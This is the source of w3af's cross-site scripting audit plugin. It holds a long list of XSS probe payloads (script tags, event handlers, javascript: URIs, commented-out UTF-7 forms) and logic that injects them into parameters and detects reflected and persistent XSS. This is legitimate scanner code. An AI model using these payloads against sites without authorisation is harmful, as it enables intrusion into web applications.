"""
xss.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.core.data.kb.knowledge_base as kb
import w3af.core.data.constants.severity as severity

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.controllers.csp.utils import site_protected_against_xss_by_csp

from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.db.disk_list import DiskList
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.fuzzer.utils import rand_alnum
from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList
from w3af.core.data.context.context import get_context_iter


RANDOMIZE = 'RANDOMIZE'


class xss(AuditPlugin):
    """
    Identify cross site scripting vulnerabilities.
    
    :author: Andres Riancho (andres.riancho@gmail.com)
    :author: Taras (oxdef@oxdef.info)
    """
    PAYLOADS = ['<ScRipT>alert("RANDOMIZE")</ScRipT>',
                '<ScRipT>prompt("RANDOMIZE")</ScRipT>',
                '<iMg src=1 OneRRor=alert("RANDOMIZE")>',
                '<video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
                '<input onmouseover=alert("RANDOMIZE")>',
                '<input onmouseclick=prompt("RANDOMIZE")>',
                '<input onmousedown=prompt("RANDOMIZE")>',
                '<input onmouseup=alert("RANDOMIZE")>',
                '<input onload=alert("RANDOMIZE")>',
                '<body onload=alert("RANDOMIZE")>',
                '<img src="javascript:alert(\'RANDOMIZE\');">',
                '<body background="javascript:alert(\'RANDOMIZE\');">',
                '<div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
                '<img dynsrc="javascript:alert(\'RANDOMIZE\');">',
                '<img lowsrc="javascript:alert(\'RANDOMIZE\');">',
                '<br size="&{alert("RANDOMIZE")}">',
                '<link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
                '<iframe src="javascript:alert(\'RANDOMIZE")\'>',
                '<table background="javascript:alert(\'RANDOMIZE\')">',
                '><ScRipT>alert("RANDOMIZE")</ScRipT>',
                '><ScRipT>prompt("RANDOMIZE")</ScRipT>',
                '><iMg src=1 OneRRor=alert("RANDOMIZE")>',
                '></iframe><iMg src=1 OneRRor=alert("RANDOMIZE")>',
                '><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
                '><input onmouseover=alert("RANDOMIZE")>',
                '><input onmouseclick=prompt("RANDOMIZE")>',
                '><input onmousedown=prompt("RANDOMIZE")>',
                '><input onmouseup=alert("RANDOMIZE")>',
                '><input onload=alert("RANDOMIZE")>',
                '><body onload=alert("RANDOMIZE")>',
                '><img src="javascript:alert(\'RANDOMIZE\');">',
                '><body background="javascript:alert(\'RANDOMIZE\');">',
                '><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
                '><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
                '><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
                '><br size="&{alert("RANDOMIZE")}">',
                '><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
                '><iframe src="javascript:alert(\'RANDOMIZE")\'>',
                '><table background="javascript:alert(\'RANDOMIZE\')">',
                '\'><ScRipT>alert("RANDOMIZE")</ScRipT>',
                '\'><ScRipT>prompt("RANDOMIZE")</ScRipT>',
                '\'><iMg src=1 OneRRor=alert("RANDOMIZE")>',
                '\'><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
                '\'><input onmouseover=alert("RANDOMIZE")>',
                '\'><input onmouseclick=prompt("RANDOMIZE")>',
                '\'><input onmousedown=prompt("RANDOMIZE")>',
                '\'><input onmouseup=alert("RANDOMIZE")>',
                '\'><input onload=alert("RANDOMIZE")>'
                '\'><body onload=alert("RANDOMIZE")>',
                '\'><img src="javascript:alert(\'RANDOMIZE\');">',
                '\'><body background="javascript:alert(\'RANDOMIZE\');">',
                '\'><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
                '\'><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
                '\'><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
                '\'><br size="&{alert("RANDOMIZE")}">',
                '\'><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
                '\'><iframe src="javascript:alert(\'RANDOMIZE")\'>',
                '\'><table background="javascript:alert(\'RANDOMIZE\')">',
                '"><ScRipT>alert("RANDOMIZE")</ScRipT>',
                '"><ScRipT>prompt("RANDOMIZE")</ScRipT>',
                '"><iMg src=1 OneRRor=alert("RANDOMIZE")>',
                '"><video><source onerror=\'javascript:prompt("RANDOMIZE")\'>',
                '"><input onmouseover=alert("RANDOMIZE")>',
                '"><input onmouseclick=prompt("RANDOMIZE")>',
                '"><input onmousedown=prompt("RANDOMIZE")>',
                '"><input onmouseup=alert("RANDOMIZE")>',
                '"><input onload=alert("RANDOMIZE")>',
                '"><body onload=alert("RANDOMIZE")>',
                '"><img src="javascript:alert(\'RANDOMIZE\');">',
                '"><body background="javascript:alert(\'RANDOMIZE\');">',
                '"><div style="height:expression(alert(\'RANDOMIZE\'),1)"/>',
                '"><img dynsrc="javascript:alert(\'RANDOMIZE\');">',
                '"><img lowsrc="javascript:alert(\'RANDOMIZE\');">',
                '"><br size="&{alert("RANDOMIZE")}">',
                '"><link rel="stylesheet" herf="javascript:alert(\'RANDOMIZE\');>',
                '"><iframe src="javascript:alert(\'RANDOMIZE")\'>',
                '"><table background="javascript:alert(\'RANDOMIZE\')">'
                # '+/v8\r\n+ADw-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+ADw-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+ADw-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+ADw-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ADw-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ADw-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ADw-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
                # '+/v8\r\n+ADw-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ADw-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ADw-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
                # '+/v8\r\n+ADw-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
                # '+/v8\r\n+ADw-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+ADw-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
                # '+/v8\r\n+AD4APA-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+AD4APA-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+AD4APA-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+AD4APA-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
                # '+/v8\r\n+AD4APA-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+AD4APA-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+AD4APA-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+AD4APA-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
                # '+/v8\r\n+AD4APA-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+AD4APA-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+AD4APA-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
                # '+/v8\r\n+AD4APA-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
                # '+/v8\r\n+AD4APA-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+AD4APA-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
                # '+/v8\r\n\'+AD4APA-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n\'+AD4APA-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n\'+AD4APA-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n\'+AD4APA-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
                # '+/v8\r\n\'+AD4APA-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n\'+AD4APA-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n\'+AD4APA-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n\'+AD4APA-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
                # '+/v8\r\n\'+AD4APA-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n\'+AD4APA-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n\'+AD4APA-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
                # '+/v8\r\n\'+AD4APA-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
                # '+/v8\r\n\'+AD4APA-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n\'+AD4APA-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-',
                # '+/v8\r\n+ACIAPgA8-ScRipT+AD4-alert(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+ACIAPgA8-ScRipT+AD4-prompt(+ACI-RANDOMIZE+ACI)+ADw-/ScRipT+AD4-',
                # '+/v8\r\n+ACIAPgA8-iMg src+AD0-1 OneRRor+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-video+AD4APA-source onerror+AD0\'javascript:prompt(+ACI-RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+ACIAPgA8-input onmouseover+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-input onmouseclick+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-input onmousedown+AD0-prompt(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-input onmouseup+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-input onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4',
                # '+/v8\r\n+ACIAPgA8-body onload+AD0-alert(+ACI-RANDOMIZE+ACI)+AD4-',
                # '+/v8\r\n+ACIAPgA8-img src+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ACIAPgA8-body background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ACIAPgA8-div style+AD0AIg-height:expression(alert(\'RANDOMIZE\'),1)+ACI-/+AD4-',
                # '+/v8\r\n+ACIAPgA8-img dynsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ACIAPgA8-img lowsrc+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAIgA+-',
                # '+/v8\r\n+ACIAPgA8-br size+AD0AIgAmAHs-alert(+ACI-RANDOMIZE+ACI)+AH0AIgA+-',
                # '+/v8\r\n+ACIAPgA8-link rel+AD0AIg-stylesheet+ACI herf+AD0AIg-javascript:alert(\'RANDOMIZE\')+ADsAPg-',
                # '+/v8\r\n+ACIAPgA8-iframe src+AD0AIg-javascript:alert(\'RANDOMIZE+ACI)\'+AD4-',
                # '+/v8\r\n+ACIAPgA8-table background+AD0AIg-javascript:alert(\'RANDOMIZE\')+ACIAPg-'
                ]

    def __init__(self):
        AuditPlugin.__init__(self)
        
        self._xss_mutants = DiskList(table_prefix='xss')

        # User configured parameters
        self._check_persistent_xss = False

    def audit(self, freq, orig_response):
        """
        Tests an URL for XSS vulnerabilities.
        
        :param freq: A FuzzableRequest
        """
        fake_mutants = create_mutants(freq, [''])

        # Before we run each fake mutant check in a different thread using the
        # worker_pool, but this lead to a strange dead-lock
        #
        #   https://github.com/andresriancho/w3af/issues/4068
        #
        # So I simply migrated this to a slower for loop.
        for fake_mutant in fake_mutants:
            self._check_xss_in_parameter(fake_mutant)

    def _check_xss_in_parameter(self, mutant):
        """
        Tries to identify (persistent) XSS in one parameter.
        """
        if not self._identify_trivial_xss(mutant):
            self._search_xss(mutant)

    def _report_vuln(self, mutant, response, mod_value):
        """
        Create a Vuln object and store it in the KB.
        
        :return: None
        """
        csp_protects = site_protected_against_xss_by_csp(response)
        vuln_severity = severity.LOW if csp_protects else severity.MEDIUM
        
        desc = 'A Cross Site Scripting vulnerability was found at: %s'
        desc %= mutant.found_at()
        
        if csp_protects:
            desc += ('The risk associated with this vulnerability was lowered'
                     ' because the site correctly implements CSP. The'
                     ' vulnerability is still a risk for the application since'
                     ' only the latest versions of some browsers implement CSP'
                     ' checking.')
        
        v = Vuln.from_mutant('Cross site scripting vulnerability', desc,
                             vuln_severity, response.id, self.get_name(),
                             mutant)
        v.add_to_highlight(mod_value) 
        
        self.kb_append_uniq(self, 'xss', v)

    def _identify_trivial_xss(self, mutant):
        """
        Identify trivial cases of XSS where all chars are echoed back and no
        filter and/or encoding is in place.
        
        :return: True in the case where a trivial XSS was identified.
        """
        payload = replace_randomize(''.join(self.PAYLOADS))

        trivial_mutant = mutant.copy()
        trivial_mutant.set_token_value(payload)
        
        response = self._uri_opener.send_mutant(trivial_mutant)

        # Add data for the persistent xss checking
        if self._check_persistent_xss:
            self._xss_mutants.append((trivial_mutant, response.id))

        # This is something I've seen in as a false positive during my
        # assessments and is better explained in this stackoverflow question
        # https://goo.gl/BgXVJY
        ct_options, _ = response.get_headers().iget('X-Content-Type-Options')
        content_type, _ = response.get_headers().iget('Content-Type')

        if content_type == 'application/json' and ct_options == 'nosniff':
            # No luck exploiting this JSON XSS
            return False

        if payload in response.get_body().lower():
            self._report_vuln(mutant, response, payload)
            return True
        
        return False

    def _search_xss(self, mutant):
        """
        Analyze the mutant for reflected XSS.
        
        @parameter mutant: A mutant that was used to test if the parameter
                           was echoed back or not
        """
        xss_strings = [replace_randomize(i) for i in self.PAYLOADS]
        fuzzable_params = [mutant.get_token_name()]

        mutant_list = create_mutants(mutant.get_fuzzable_request(),
                                     xss_strings,
                                     fuzzable_param_list=fuzzable_params)

        self._send_mutants_in_threads(self._uri_opener.send_mutant,
                                      mutant_list,
                                      self._analyze_echo_result)

    def _analyze_echo_result(self, mutant, response):
        """
        Do we have a reflected XSS?
        
        :return: None, record all the results in the kb.
        """
        # Add data for the persistent xss checking
        if self._check_persistent_xss:
            self._xss_mutants.append((mutant, response.id))

        with self._plugin_lock:
            
            if self._has_bug(mutant):
                return
            
            sent_payload = mutant.get_token_payload()

            # TODO: https://github.com/andresriancho/w3af/issues/12305
            body_lower = response.get_body().lower()
            sent_payload_lower = sent_payload.lower()

            for context in get_context_iter(body_lower, sent_payload_lower):
                if context.is_executable() or context.can_break():
                    self._report_vuln(mutant, response, sent_payload)
                    return

    def end(self):
        """
        This method is called when the plugin wont be used anymore.
        """
        if self._check_persistent_xss:
            self._identify_persistent_xss()
        
        self._xss_mutants.cleanup()
    
    def _identify_persistent_xss(self):
        """
        This method is called to check for persistent xss. 
    
        Many times a xss isn't on the page we get after the GET/POST of
        the xss string. This method searches for the xss string on all
        the pages that are known to the framework.
        
        :return: None, Vuln (if any) are saved to the kb.
        """
        # Get all known fuzzable requests from the core
        fuzzable_requests = kb.kb.get_all_known_fuzzable_requests()
        
        self._send_mutants_in_threads(self._uri_opener.send_mutant,
                                      fuzzable_requests,
                                      self._analyze_persistent_result,
                                      grep=False, cache=False)    
    
    def _analyze_persistent_result(self, fuzzable_request, response):
        """
        After performing an HTTP request to "fuzzable_request" and getting
        "response" analyze if the response contains any of the information sent
        by any of the mutants.
        
        :return: None, Vuln (if any) are saved to the kb.
        """
        body = response.get_body()

        for mutant, mutant_response_id in self._xss_mutants:

            sent_payload = mutant.get_token_payload()

            for context in get_context_iter(body, sent_payload):
                if context.is_executable() or context.can_break():
                    self._report_persistent_vuln(mutant, response,
                                                 mutant_response_id,
                                                 sent_payload,
                                                 fuzzable_request)
                    break
    
    def _report_persistent_vuln(self, mutant, response, mutant_response_id,
                                mod_value, fuzzable_request):
        """
        Report a persistent XSS vulnerability to the core.
        
        :return: None, a vulnerability is saved in the KB.
        """
        response_ids = [response.id, mutant_response_id]
        name = 'Persistent Cross-Site Scripting vulnerability'
        
        desc = ('A persistent Cross Site Scripting vulnerability'
                ' was found by sending "%s" to the "%s" parameter'
                ' at %s, which is echoed when browsing to %s.')
        desc %= (mod_value, mutant.get_token_name(), mutant.get_url(),
                 response.get_url())
        
        csp_protects = site_protected_against_xss_by_csp(response)
        vuln_severity = severity.MEDIUM if csp_protects else severity.HIGH
        
        if csp_protects:
            desc += ('The risk associated with this vulnerability was lowered'
                     ' because the site correctly implements CSP. The'
                     ' vulnerability is still a risk for the application since'
                     ' only the latest versions of some browsers implement CSP'
                     ' checking.')
                    
        v = Vuln.from_mutant(name, desc, vuln_severity,
                             response_ids, self.get_name(),
                             mutant)
        
        v['persistent'] = True
        v['write_payload'] = mutant
        v['read_payload'] = fuzzable_request
        v.add_to_highlight(mutant.get_token_payload())

        om.out.vulnerability(v.get_desc())
        self.kb_append_uniq(self, 'xss', v)

    def get_options(self):
        """
        :return: A list of option objects for this plugin.
        """
        ol = OptionList()
        
        d1 = 'Identify persistent cross site scripting vulnerabilities'
        h1 = ('If set to True, w3af will navigate all pages of the target one'
              ' more time, searching for persistent cross site scripting'
              ' vulnerabilities.')
        o1 = opt_factory('persistent_xss', self._check_persistent_xss, d1,
                         'boolean', help=h1)
        ol.add(o1)
        
        return ol
        
    def set_options(self, options_list):
        """
        This method sets all the options that are configured using the user
        interface generated by the framework using the result of get_options().
        
        :param options_list: A dictionary with the options for the plugin.
        :return: No value is returned.
        """
        self._check_persistent_xss = options_list['persistent_xss'].get_value()
        
    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin finds Cross Site Scripting (XSS) vulnerabilities.
        
        One configurable parameters exists:
            - persistent_xss
            
        To find XSS bugs the plugin will send a set of javascript strings to
        every parameter, and search for that input in the response.
        
        The "persistent_xss" parameter makes the plugin store all data
        sent to the web application and at the end, request all URLs again
        searching for those specially crafted strings.
        """


def replace_randomize(data):
    rand_str = rand_alnum(5).lower()
    return data.replace(RANDOMIZE, rand_str)
